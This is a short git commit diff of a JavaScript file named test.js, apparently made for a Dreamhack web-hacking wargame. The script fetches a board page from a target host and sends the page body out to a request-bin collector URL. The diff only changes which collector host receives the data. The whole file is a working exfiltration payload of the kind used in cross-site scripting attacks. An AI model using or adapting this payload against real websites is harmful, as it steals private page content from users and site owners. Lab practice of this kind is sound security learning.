1f8aff7065a27e758282157caef4045abbb8bc9b
likeash <likeash1235@gmail.com>
2026-07-27 19:46:03 +0900

    new file

--- test.js
+++ test.js
@@ -2,7 +2,7 @@ fetch("http://edu.arang.kr:9103/board/0")
   .then(r => r.text())
   .then(body => {
     fetch(
-      "https://tools.dreamhack.games/requestbin/kufgixl?x=" +
+      "https://cgupcon.request.dreamhack.games?x=" +
       encodeURIComponent(body)
     );
   });
